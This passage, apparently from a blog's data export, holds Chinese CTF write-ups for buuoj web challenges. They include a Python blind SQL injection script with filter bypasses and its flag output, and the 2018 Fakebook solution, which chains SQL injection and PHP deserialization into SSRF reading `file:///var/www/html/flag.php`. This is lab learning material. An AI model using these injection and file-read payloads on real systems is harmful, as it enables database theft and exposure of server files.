align=\"center\">`</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">“</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">||</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;&amp;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">%23</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\"><code>if,substr,ascii,&lt;,&gt;,=,(),/t</code>都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用<code>/t、( )代替</code></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 12/27/2019 6:11 PM</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn/index.php\"</span></span><br><span class=\"line\">result = <span class=\"string\">''</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, <span class=\"number\">43</span>):</span><br><span class=\"line\">    high = <span class=\"number\">126</span></span><br><span class=\"line\">    low = <span class=\"number\">45</span></span><br><span class=\"line\">    mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> high - low &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">\"if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)\"</span> % (x, mid)</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        time.sleep(<span class=\"number\">0.3</span>)</span><br><span class=\"line\">        res = requests.post(url, data = data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Hello'</span> <span class=\"keyword\">in</span> res.text:</span><br><span class=\"line\">            low = mid</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            high = mid</span><br><span class=\"line\">        mid = (low + high) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> high - low == <span class=\"number\">1</span>:</span><br><span class=\"line\">        payload = <span class=\"string\">\"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)\"</span> % (x, high)</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">\"id\"</span>: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        response = requests.post(url, data=data)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'Hello'</span> <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">            result += chr(int(mid+<span class=\"number\">1</span>))</span><br><span class=\"line\">        <span class=\"keyword\">else</span> :</span><br><span class=\"line\">            result += chr(int(mid))</span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        result += chr(int(mid))</span><br><span class=\"line\">    print(result)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f</span><br><span class=\"line\">fl</span><br><span class=\"line\">fla</span><br><span class=\"line\">flag</span><br><span class=\"line\">flag&#123;</span><br><span class=\"line\">flag&#123;a</span><br><span class=\"line\">flag&#123;a2</span><br><span class=\"line\">flag&#123;a22</span><br><span class=\"line\">flag&#123;a22c</span><br><span class=\"line\">flag&#123;a22cf</span><br><span class=\"line\">flag&#123;a22cf6</span><br><span class=\"line\">flag&#123;a22cf69</span><br><span class=\"line\">flag&#123;a22cf690</span><br><span class=\"line\">flag&#123;a22cf690-</span><br><span class=\"line\">flag&#123;a22cf690-3</span><br><span class=\"line\">flag&#123;a22cf690-34</span><br><span class=\"line\">flag&#123;a22cf690-342</span><br><span class=\"line\">flag&#123;a22cf690-342a</span><br><span class=\"line\">flag&#123;a22cf690-342a-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-8</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-88</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b<span class=\"_\">-d</span></span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df3</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df33</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d446</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4469</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。</p>"},{"title":"buuoj刷题记录5","date":"2019-12-30T08:19:44.000Z","_content":"\n## [网鼎杯 2018]Fakebook\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\n<!--more-->\n\n### 0x01 分析\n\n访问`robots.txt`，给了一个提示\n\n```html\nUser-agent: *\nDisallow: /user.php.bak\n```\n\n拿到`user.php`的源码\n\n```php\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();   //初始化链接\n\n        curl_setopt($ch, CURLOPT_URL, $url);     //设置CURLOPT_URL\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //将curl_exec()获取的信息以文件流的形式返回,而不是直接输出\n        $output = curl_exec($ch);      /执行CURL会话;此处存在ssrf\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);  //获取博客地址\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);  //博客地址有过滤\n    }\n\n}\n```\n\n访问`flag.php`，显示返回是200。那么应该是要将`./flag.php`写入博客地址，让程序加载。\n\n在加入一个用户时的`username`存在post注入，加入完成，进入到`view.php`发现也存在注入\n\n### 0x02 开始操作\n\n使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。\n\n![](/pic/4.png)\n```\npayload=view.php?no=0/**/union/**/select/**/1,2,3,'O:8:\"UserInfo\":3{s:4:\"name\";s:4:\"and\";s:3:\"age\";i:12;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'\n```\n\n执行结果\n\n![](/pic/5.png)\n\n查看源码\n\n```html\n<!doctype html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\"\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>User</title>\n\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\n</head>\n<body>\n<div class=\"container\">\n    <table class=\"table\">\n        <tr>\n            <th>\n                username\n            </th>\n            <th>\n                age\n            </th>\n            <th>\n                blog\n            </th>\n        </tr>\n        <tr>\n            <td>\n                2            </td>\n            <td>\n                12            </td>\n            <td>\n                file:///var/www/html/flag.php            </td>\n        </tr>\n    </table>\n\n    <hr>\n    <br><br><br><br><br>\n    <p>the contents of his/her blog</p>\n    <hr>\n    <iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='>\n</div>\n</body>\n</html>\n```\n\n点击即可看见flag\n\n```php\n<?php\n\n$flag = \"flag{835065b6-b60d-49da-a92b-dd80d38032dc}\";\nexit(0);\n\n```\n\n","source":"_posts/buuoj刷题记录5.md","raw":"---\ntitle: buuoj刷题记录5\ndate: 2019-12-30 16:19:44\ntags:\n - 网鼎杯2018\n - buuctf\n - web\ncategories: \n - 刷题记录\n---\n\n## [网鼎杯 2018]Fakebook\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\n<!--more-->\n\n### 0x01 分析\n\n访问`robots.txt`，给了一个提示\n\n```html\nUser-agent: *\nDisallow: /user.php.bak\n```\n\n拿到`user.php`的源码\n\n```php\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();   //初始化链接\n\n        curl_setopt($ch, CURLOPT_URL, $url);     //设置CURLOPT_URL\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //将curl_exec()获取的信息以文件流的形式返回,而不是直接输出\n        $output = curl_exec($ch);      /执行CURL会话;此处存在ssrf\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);  //获取博客地址\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);  //博客地址有过滤\n    }\n\n}\n```\n\n访问`flag.php`，显示返回是200。那么应该是要将`./flag.php`写入博客地址，让程序加载。\n\n在加入一个用户时的`username`存在post注入，加入完成，进入到`view.php`发现也存在注入\n\n### 0x02 开始操作\n\n使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。\n\n![](/pic/4.png)\n```\npayload=view.php?no=0/**/union/**/select/**/1,2,3,'O:8:\"UserInfo\":3{s:4:\"name\";s:4:\"and\";s:3:\"age\";i:12;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'\n```\n\n执行结果\n\n![](/pic/5.png)\n\n查看源码\n\n```html\n<!doctype html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\"\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>User</title>\n\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\n</head>\n<body>\n<div class=\"container\">\n    <table class=\"table\">\n        <tr>\n            <th>\n                username\n            </th>\n            <th>\n                age\n            </th>\n            <th>\n                blog\n            </th>\n        </tr>\n        <tr>\n            <td>\n                2            </td>\n            <td>\n                12            </td>\n            <td>\n                file:///var/www/html/flag.php            </td>\n        </tr>\n    </table>\n\n    <hr>\n    <br><br><br><br><br>\n    <p>the contents of his/her blog</p>\n    <hr>\n    <iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='>\n</div>\n</body>\n</html>\n```\n\n点击即可看见flag\n\n```php\n<?php\n\n$flag = \"flag{835065b6-b60d-49da-a92b-dd80d38032dc}\";\nexit(0);\n\n```\n\n","slug":"buuoj刷题记录5","published":1,"updated":"2019-12-30T08:19:44.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfl4000hpk7e9mtz836k","content":"<h2 id=\"网鼎杯-2018-Fakebook\"><a href=\"#网鼎杯-2018-Fakebook\" class=\"headerlink\" title=\"[网鼎杯 2018]Fakebook\"></a>[网鼎杯 2018]Fakebook</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>访问<code>robots.txt</code>，给了一个提示</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure>\n\n<p>拿到<code>user.php</code>的源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">UserInfo</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $age = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $blog = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($name, $age, $blog)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;name = $name;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;age = (int)$age;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;blog = $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();   <span class=\"comment\">//初始化链接</span></span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);     <span class=\"comment\">//设置CURLOPT_URL</span></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);   <span class=\"comment\">//将curl_exec()获取的信息以文件流的形式返回,而不是直接输出</span></span><br><span class=\"line\">        $output = curl_exec($ch);      /执行CURL会话;此处存在ssrf</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($httpCode == <span class=\"number\">404</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">404</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getBlogContents</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;get(<span class=\"keyword\">$this</span>-&gt;blog);  <span class=\"comment\">//获取博客地址</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValidBlog</span> <span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $blog = <span class=\"keyword\">$this</span>-&gt;blog;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> preg_match(<span class=\"string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span>, $blog);  <span class=\"comment\">//博客地址有过滤</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>访问<code>flag.php</code>，显示返回是200。那么应该是要将<code>./flag.php</code>写入博客地址，让程序加载。</p>\n<p>在加入一个用户时的<code>username</code>存在post注入，加入完成，进入到<code>view.php</code>发现也存在注入</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。</p>\n<p><img src=\"/pic/4.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload&#x3D;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:4:&quot;and&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>\n\n<p>执行结果</p>\n<p><img src=\"/pic/5.png\" alt=\"\"></p>\n<p>查看源码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!doctype <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"ko\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>User<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"css/bootstrap.min.css\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/jquery-3.3.1.slim.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/popper.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/bootstrap.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">class</span>=<span class=\"string\">\"table\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                username</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                age</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                blog</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                2            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                12            <span class=\"tag\">&lt;/<span 